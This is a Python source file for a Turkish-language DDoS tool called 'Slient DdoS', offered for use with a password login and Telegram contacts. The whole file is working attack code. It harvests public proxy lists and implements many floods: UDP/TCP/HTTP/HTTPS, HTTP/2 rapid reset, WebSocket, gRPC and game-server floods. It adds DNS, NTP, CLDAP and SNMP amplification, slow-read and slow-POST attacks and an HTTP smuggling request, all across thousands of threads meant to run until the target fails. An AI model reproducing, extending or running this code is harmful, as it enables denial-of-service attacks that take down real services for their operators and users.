#!/usr/bin/python3
import os, time, sys, hashlib, socket, threading, platform, random, struct, json, base64, ssl
import urllib.request, urllib.parse, http.client, subprocess, getpass
from concurrent.futures import ThreadPoolExecutor
import ipaddress

# ========== GİRİŞ SİSTEMİ ==========
KULLANICI_ADI = "Zeldy"
SIFRE = "ZeldyHere1+"

def login():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(gradient_text(pad + "╔═════════════════════════════════════╗"))
    print(gradient_text(pad + "║      Slient DdoS Login              ║"))
    print(gradient_text(pad + "║   For the password: t.me/Zeldy_here ║"))
    print(gradient_text(pad + "╚═════════════════════════════════════╝"))
    
    username = input("Username:  ")
    password = getpass.getpass("password: ")
    
    if username != KULLANICI_ADI or password != SIFRE:
        print("\nHatalı kullanıcı adı veya şifre!")
        time.sleep(2)
        return False
    
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mSlient \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Zeldy ! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Zeldy \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v6.0')
    time.sleep(1)
    return True

# ========== GEREKLİ KÜTÜPHANELER ==========
try:
    import cloudscraper, requests, socks, dns.resolver, psutil
    from colorama import Fore, init, Style
    init()
except ImportError:
    os.system("pip install cloudscraper requests PySocks dnspython colorama psutil")
    import cloudscraper, requests, socks, dns.resolver, psutil
    from colorama import Fore, init, Style
    init()

# ========== PROXY YÖNETİCİ (SOCKS5 + HTTP) ==========
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working = []
        self.current_index = 0
        self.lock = threading.Lock()
        self.load_proxies()
        self.test_proxies()
    
    def load_proxies(self):
        print(Fore.YELLOW + "[*] Proxy listesi yükleniyor..." + Fore.RESET)
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        self.proxies.append(line)
        
        # HTTP, SOCKS4, SOCKS5 kaynakları
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt"
        ]
        for src in sources:
            try:
                r = requests.get(src, timeout=3)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        line = line.strip()
                        if ':' in line and len(line.split(':')) == 2:
                            if line not in self.proxies:
                                self.proxies.append(line)
            except:
                pass
        
        if not self.proxies:
            for _ in range(500):
                self.proxies.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}:{random.randint(1000,65535)}")
        
        print(Fore.GREEN + f"[✓] {len(self.proxies)} proxy yüklendi" + Fore.RESET)
    
    def test_proxies(self):
        print(Fore.YELLOW + "[*] Proxy'ler test ediliyor..." + Fore.RESET)
        def test_single(proxy):
            try:
                ip, port = proxy.split(':')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((ip, int(port)))
                s.close()
                return proxy
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=100) as ex:
            futures = [ex.submit(test_single, p) for p in self.proxies[:800]]
            for f in futures:
                result = f.result()
                if result:
                    self.working.append(result)
        
        if not self.working and self.proxies:
            for p in self.proxies[:300]:
                try:
                    ip, port = p.split(':')
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((ip, int(port)))
                    s.close()
                    self.working.append(p)
                except:
                    pass
        
        print(Fore.GREEN + f"[✓] {len(self.working)} çalışan proxy" + Fore.RESET)
    
    def get_proxy(self):
        with self.lock:
            if self.working:
                proxy = self.working[self.current_index % len(self.working)]
                self.current_index += 1
                return proxy
            return None

# ========== GRADIENT TEXT ==========
line_palette = [203, 203, 210, 210, 217, 217, 224, 224, 231, 231, 231, 224, 224, 217, 217, 210, 210, 203, 203]

def gradient_text(text):
    result = ""
    for i, char in enumerate(text):
        color = line_palette[i % len(line_palette)]
        result += f"\033[38;5;{color}m{char}"
    return result + "\033[0m"

print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to ZxC C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: zxcr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v6.0')

pad = " " * 4
small_pad = " " * 7

ascii_art = [
"         ╔═╗ ╦   ╦  ╔═╗ ╔╗╔ ╔╦╗",
"         ╚═╗ ║   ║  ║╣  ║║║  ║ ",
"         ╚═╝ ╚═╝ ╩  ╚═╝ ╝╚╝  ╩ "
]

def show_logo_and_boxes():
    for line in ascii_art:
        print(gradient_text(pad + line))
    print(gradient_text(pad + "╔════════════════════════════════════╗"))
    print(gradient_text(pad + "║        DdoS Attack Tool            ║"))
    print(gradient_text(pad + "║      Telegram: @SlientBotnet       ║"))
    print(gradient_text(pad + "╚════════════════════════════════════╝"))
    print(gradient_text(small_pad + "╔══════════════════════════════╗"))
    print(gradient_text(small_pad + "║    write 'help' for usage    ║"))
    print(gradient_text(small_pad + "╚══════════════════════════════╝"))

# ========== HIZ KONTROL ==========
class SpeedControl:
    def __init__(self, hiz=50):
        self.hiz = max(1, min(999, hiz))
        self.thread_carpani = self.hiz / 5
        self.packet_carpani = self.hiz / 2
        self.delay_carpani = max(0.000001, 0.01 / self.hiz)
        self.cpu_limit = 85
        self.ram_limit = 90
        
    def get_thread(self, base=500):
        return min(20000, int(base * self.thread_carpani) + 50)
    
    def get_packet(self, base=500):
        return min(10000, int(base * self.packet_carpani) + 50)
    
    def get_delay(self):
        return self.delay_carpani
    
    def check_system(self):
        try:
            cpu = psutil.cpu_percent(interval=0.1)
            ram = psutil.virtual_memory().percent
            if cpu > self.cpu_limit or ram > self.ram_limit:
                time.sleep(0.5)
                return False
            return True
        except:
            return True

# ========== MULTI-TARGET YÖNETİCİ ==========
class TargetManager:
    def __init__(self):
        self.targets = []
        self.current_index = 0
        self.lock = threading.Lock()
        self.load_targets()
    
    def load_targets(self):
        if os.path.exists('targets.txt'):
            with open('targets.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        ip, port = line.split(':')
                        self.targets.append((ip, int(port)))
        if not self.targets:
            self.targets = [("127.0.0.1", 80)]
    
    def get_target(self):
        with self.lock:
            target = self.targets[self.current_index % len(self.targets)]
            self.current_index += 1
            return target

# ========== SALDIRI MOTORU ==========
class AttackEngine:
    def __init__(self, target, port, method, hiz=50):
        self.target = target
        self.port = port
        self.method = method
        self.hiz = hiz
        self.ip = socket.gethostbyname(target)
        self.running = True
        self.packet_count = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.speed = SpeedControl(hiz)
        self.proxy_manager = ProxyManager()
        self.target_manager = TargetManager()
        
        # IPv6 desteği
        self.ipv6 = False
        try:
            if ':' in target:
                self.ip = socket.getaddrinfo(target, port, socket.AF_INET6)[0][4][0]
                self.ipv6 = True
        except:
            pass
        
        self.fake = []
        for _ in range(5000):
            self.fake.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        
        self.ua = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) Safari/605.1.15'
        ]
        self.packet_pool = [random._urandom(65500) for _ in range(50)]
        self.small_pool = [random._urandom(1490) for _ in range(50)]

    # ===== FLOOD METHODS =====
    def run_flood_udp_super(self):
        s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)
        adet = self.speed.get_packet(2000)
        for _ in range(adet):
            s.sendto(random.choice(self.packet_pool), (self.ip, self.port))
        s.close()
        with self.lock:
            self.packet_count += adet

    def run_flood_tcp_super(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.0001)
            s.setblocking(False)
            for _ in range(50):
                s.connect_ex((self.ip, self.port))
                s.send(random._urandom(2048))
            s.close()
            with self.lock:
                self.packet_count += 50
        except:
            pass

    def run_flood_http_super(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect((self.ip, self.port))
            req = f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(self.ua)}\r\n\r\n"
            for _ in range(100):
                s.send(req.encode())
            s.close()
            with self.lock:
                self.packet_count += 100
        except:
            pass

    def run_flood_https_super(self):
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            ssl_sock = context.wrap_socket(s, server_hostname=self.target)
            ssl_sock.connect((self.ip, self.port))
            req = f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(self.ua)}\r\n\r\n"
            for _ in range(50):
                ssl_sock.send(req.encode())
            ssl_sock.close()
            with self.lock:
                self.packet_count += 50
        except:
            pass

    # ===== HTTP/2 Rapid Reset (Simüle) =====
    def run_http2_rapid_reset(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            # HTTP/2 PRI önsözü + ayar çerçeveleri
            s.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            for _ in range(20):
                # HEADERS + RST_STREAM çerçeveleri
                s.send(b'\x00\x00\x10\x01\x04\x00\x00\x00\x00\x00' + random._urandom(16))
                s.send(b'\x00\x00\x04\x03\x00\x00\x00\x00\x00\x00')
            s.close()
            with self.lock:
                self.packet_count += 40
        except:
            pass

    # ===== WebSocket Flood =====
    def run_websocket_flood(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            # WebSocket el sıkışması
            key = base64.b64encode(random._urandom(16)).decode()
            req = f"GET /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
            s.send(req.encode())
            for _ in range(10):
                # WebSocket çerçeveleri (text frame)
                payload = random._urandom(1000)
                frame = b'\x81' + struct.pack('>H', len(payload)) + payload
                s.send(frame)
            s.close()
            with self.lock:
                self.packet_count += 10
        except:
            pass

    # ===== gRPC Flood =====
    def run_grpc_flood(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            for _ in range(10):
                # gRPC çerçevesi (uzunluk + veri)
                data = random._urandom(1000)
                frame = struct.pack('>I', len(data)) + data
                s.send(frame)
            s.close()
            with self.lock:
                self.packet_count += 10
        except:
            pass

    # ===== DNS Amplification (Gelişmiş) =====
    def run_dns_amp_advanced(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            # Çoklu sorgu tipleri
            queries = [
                b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01',
                b'\xbb\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x1c\x00\x01',
                b'\xcc\xcc\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x0f\x00\x01'
            ]
            for q in queries:
                s.sendto(q, (self.ip, 53))
            s.close()
            with self.lock:
                self.packet_count += 3
        except:
            pass

    # ===== NTP Monlist =====
    def run_ntp_monlist(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            # NTP monlist sorgusu
            ntp = b'\x17\x00\x03\x2a' + b'\x00' * 8 + b'\x00\x00\x00\x00\x00\x00\x00\x00'
            s.sendto(ntp, (self.ip, 123))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== CLDAP Amplification =====
    def run_cldap_amp(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            # CLDAP sorgusu
            cldap = b'\x30\x84\x00\x00\x00\x0c\x02\x01\x01\x60\x84\x00\x00\x00\x06\x02\x01\x03\x04\x00\x00\x00'
            s.sendto(cldap, (self.ip, 389))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== SNMP Amplification =====
    def run_snmp_amp(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            # SNMP GetBulk sorgusu
            snmp = b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'
            s.sendto(snmp, (self.ip, 161))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== Minecraft Bedrock =====
    def run_minecraft_bedrock(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            # Bedrock ping packet
            packet = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            s.sendto(packet, (self.ip, self.port if self.port else 19132))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== Steam/Source Engine =====
    def run_steam_amp(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            # A2S_INFO sorgusu
            packet = b'\xFF\xFF\xFF\xFFTSource Engine Query\x00'
            s.sendto(packet, (self.ip, self.port if self.port else 27015))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== Discord Voice Flood =====
    def run_discord_voice(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            # Discord voice packet
            packet = b'\x80\x78\x00\x00' + random._urandom(1000)
            s.sendto(packet, (self.ip, self.port if self.port else 50000))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== TeamSpeak =====
    def run_teamspeak(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            # TeamSpeak query
            packet = b'\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(100)
            s.sendto(packet, (self.ip, self.port if self.port else 9987))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== Fortnite =====
    def run_fortnite(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            # Fortnite query
            packet = b'\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(500)
            s.sendto(packet, (self.ip, self.port if self.port else 5000))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== Slow Read =====
    def run_slow_read(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.ip, self.port))
            req = f"GET /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
            s.send(req.encode())
            # Çok yavaş oku
            for _ in range(10):
                time.sleep(0.5)
                s.recv(1)
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== Slow POST =====
    def run_slow_post(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.ip, self.port))
            data = random._urandom(1000000)
            req = f"POST /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\nContent-Length: {len(data)}\r\n\r\n".encode()
            s.send(req)
            # Veriyi yavaş gönder
            for i in range(0, len(data), 100):
                s.send(data[i:i+100])
                time.sleep(0.1)
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== HTTP Smuggling =====
    def run_http_smuggling(self):
        try:
            s = socket.socket(socket.AF_INET6 if self.ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            payload = f"POST /admin HTTP/1.1\r\nHost: {self.target}\r\nContent-Length: 10\r\n\r\nGET / HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
            s.send(payload.encode())
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== ANA DÖNGÜ =====
    def attack_loop(self):
        delay = self.speed.get_delay()
        multi_targets = self.target_manager.targets if len(self.target_manager.targets) > 1 else [(self.ip, self.port)]
        
        while self.running:
            if not self.speed.check_system():
                time.sleep(0.1)
                continue
            try:
                # Multi-target
                for ip, port in multi_targets[:3]:
                    if not self.running:
                        break
                    self.ip = ip
                    self.port = port
                    
                    if self.method == '!floodudp':
                        self.run_flood_udp_super()
                    elif self.method == '!floodtcp':
                        self.run_flood_tcp_super()
                    elif self.method == '!floodhttp':
                        self.run_flood_http_super()
                    elif self.method == '!floodhttps':
                        self.run_flood_https_super()
                    elif self.method == '!floodall':
                        self.run_flood_udp_super()
                        self.run_flood_tcp_super()
                        self.run_flood_http_super()
                        if self.port == 443:
                            self.run_flood_https_super()
                    elif self.method == '!http2reset':
                        self.run_http2_rapid_reset()
                    elif self.method == '!websocket':
                        self.run_websocket_flood()
                    elif self.method == '!grpc':
                        self.run_grpc_flood()
                    elif self.method == '!dnsamp':
                        self.run_dns_amp_advanced()
                    elif self.method == '!ntpmon':
                        self.run_ntp_monlist()
                    elif self.method == '!cldap':
                        self.run_cldap_amp()
                    elif self.method == '!snmp':
                        self.run_snmp_amp()
                    elif self.method == '!bedrock':
                        self.run_minecraft_bedrock()
                    elif self.method == '!steam':
                        self.run_steam_amp()
                    elif self.method == '!discord':
                        self.run_discord_voice()
                    elif self.method == '!teamspeak':
                        self.run_teamspeak()
                    elif self.method == '!fortnite':
                        self.run_fortnite()
                    elif self.method == '!slowread':
                        self.run_slow_read()
                    elif self.method == '!slowpost':
                        self.run_slow_post()
                    elif self.method == '!smuggle':
                        self.run_http_smuggling()
                    elif self.method == '!max':
                        for _ in range(3):
                            self.run_flood_udp_super()
                            self.run_flood_tcp_super()
                            self.run_flood_http_super()
                            self.run_flood_https_super()
                            self.run_http2_rapid_reset()
                            self.run_websocket_flood()
                            self.run_dns_amp_advanced()
                            self.run_ntp_monlist()
                            self.run_minecraft_bedrock()
                            self.run_steam_amp()
                    else:
                        self.run_flood_udp_super()
                    time.sleep(delay)
            except:
                continue

    def start_attack(self):
        print(Fore.GREEN + f"\n[✓] Hedef: {self.target} ({self.ip}:{self.port})")
        print(Fore.GREEN + f"[✓] Yöntem: {self.method.upper()}")
        print(Fore.GREEN + f"[✓] Hız: {self.hiz}")
        print(Fore.GREEN + f"[✓] Proxy: {len(self.proxy_manager.working)} çalışan")
        print(Fore.GREEN + f"[✓] IPv6: {'Evet' if self.ipv6 else 'Hayır'}")
        
        if len(self.target_manager.targets) > 1:
            print(Fore.GREEN + f"[✓] Multi-Target: {len(self.target_manager.targets)} hedef")
        
        thrs = self.speed.get_thread(500)
        print(Fore.YELLOW + f"[*] {thrs} thread başlatılıyor (KALICI)...")
        
        for _ in range(thrs):
            t = threading.Thread(target=self.attack_loop, daemon=True)
            t.start()
        
        print(Fore.RED + "[*] SUNUCU KAPANANA KADAR SALDIRI DEVAM EDECEK!" + Fore.RESET)
        print(Fore.YELLOW + "[*] Çıkmak için CTRL+C\n")
        
        try:
            while self.running:
                time.sleep(5)
                elapsed = time.time() - self.start_time
                pps = self.packet_count / elapsed if elapsed > 0 else 0
                print(Fore.CYAN + f"[+] {self.packet_count:,} paket | PPS: {pps:,.0f} | {elapsed:.0f}s" + Fore.RESET)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Durduruldu." + Fore.RESET)
            self.running = False

# ========== YARDIM ==========
def show_help():
    print(Fore.LIGHTCYAN_EX + "\n" + "="*60)
    print(Fore.LIGHTCYAN_EX + " SLİENT DDoS v6.0 - ULTRA GÜÇLÜ")
    print(Fore.LIGHTCYAN_EX + "="*60)
    print(Fore.LIGHTGREEN_EX + "   <Hedef> <Port> <!Yöntem> <Hız(1-999)>")
    
    print(Fore.WHITE + "\n🚀 SÜPER FLOOD:")
    print(Fore.LIGHTYELLOW_EX + "  !floodudp, !floodtcp, !floodhttp, !floodhttps, !floodall")
    
    print(Fore.WHITE + "\n🆕 YENİ PROTOKOLLER:")
    print(Fore.LIGHTYELLOW_EX + "  !http2reset  " + Fore.WHITE + "-> HTTP/2 Rapid Reset")
    print(Fore.LIGHTYELLOW_EX + "  !websocket   " + Fore.WHITE + "-> WebSocket Flood")
    print(Fore.LIGHTYELLOW_EX + "  !grpc        " + Fore.WHITE + "-> gRPC Flood")
    
    print(Fore.WHITE + "\n📡 AMPLIFICATION (GELİŞMİŞ):")
    print(Fore.LIGHTYELLOW_EX + "  !dnsamp, !ntpmon, !cldap, !snmp")
    
    print(Fore.WHITE + "\n🎮 GAME SERVER (YENİ):")
    print(Fore.LIGHTYELLOW_EX + "  !bedrock, !steam, !discord, !teamspeak, !fortnite")
    
    print(Fore.WHITE + "\n🐌 SLOW ATTACKS:")
    print(Fore.LIGHTYELLOW_EX + "  !slowread, !slowpost, !smuggle")
    
    print(Fore.WHITE + "\n⚡ KOMBİNE:")
    print(Fore.LIGHTYELLOW_EX + "  !max")
    
    print(Fore.WHITE + "\n📌 ÖRNEKLER:")
    print(Fore.LIGHTGREEN_EX + "   example.com 443 !http2reset 500")
    print(Fore.LIGHTGREEN_EX + "   example.com 80 !websocket 300")
    print(Fore.LIGHTGREEN_EX + "   example.com 19132 !bedrock 999")
    print(Fore.LIGHTGREEN_EX + "   example.com 53 !dnsamp 200")
    print(Fore.LIGHTGREEN_EX + "   example.com 443 !max 500")
    
    print(Fore.WHITE + "\n📁 targets.txt DOSYASI:")
    print(Fore.LIGHTGREEN_EX + "   ip:port satır satır yazılır (multi-target)")
    
    print(Fore.RED + "\n⚠️  SUNUCU KAPANANA KADAR KALICI SALDIRI!" + Fore.RESET)
    sys.exit()

# ========== PROMPT ==========
def prompt():
    print(Fore.WHITE + "┌──[SlientC2] - [SlientC2/root]")
    print(Fore.WHITE + "└─➤  ", end="")
    sys.stdout.write("\033[0m")
    sys.stdout.flush() 
    return input()

# ========== ANA ==========
if __name__ == "__main__":
    if not login():
        sys.exit(1)
    
    if os.name == "posix": os.system('clear')
    elif os.name == "nt": os.system('cls')
    show_logo_and_boxes()

    if len(sys.argv) == 2 and 'help' in sys.argv[1].lower():
        show_help()

    try:
        if len(sys.argv) < 4:
            user_input = prompt()
            if "help" in user_input.lower() or "-h" in user_input.lower():
                show_help()
            parts = user_input.split()
            if len(parts) < 3:
                print(Fore.RED + "Eksik parametre!")
                sys.exit()
            raw_input, port, method_input = parts[0], int(parts[1]), parts[2].strip().lower()
            hiz = int(parts[3]) if len(parts) > 3 else 50
        else:
            raw_input = sys.argv[1]
            port = int(sys.argv[2])
            method_input = sys.argv[3].lower()
            hiz = int(sys.argv[4]) if len(sys.argv) > 4 else 50

        valid_methods = [
            '!floodudp', '!floodtcp', '!floodhttp', '!floodhttps', '!floodall',
            '!http2reset', '!websocket', '!grpc',
            '!dnsamp', '!ntpmon', '!cldap', '!snmp',
            '!bedrock', '!steam', '!discord', '!teamspeak', '!fortnite',
            '!slowread', '!slowpost', '!smuggle',
            '!max'
        ]
        
        if method_input not in valid_methods:
            print(Fore.LIGHTRED_EX + f"[!] Geçersiz yöntem: {method_input}")
            print(Fore.LIGHTRED_EX + f"[!] Geçerli olanlar: {', '.join(valid_methods)}")
            sys.exit()

        hiz = max(1, min(999, hiz))
        clean_host = raw_input.replace("http://", "").replace("https://", "").split("/")[0]
        
        engine = AttackEngine(clean_host, port, method_input, hiz)
        engine.start_attack()

    except (ValueError, IndexError) as e:
        print(Fore.RED + f"\n Hata: {e}")
        print(Fore.YELLOW + " Doğru kullanım: <hedef> <port> <yöntem> <hız>")
        print(Fore.YELLOW + "write 'help'")

     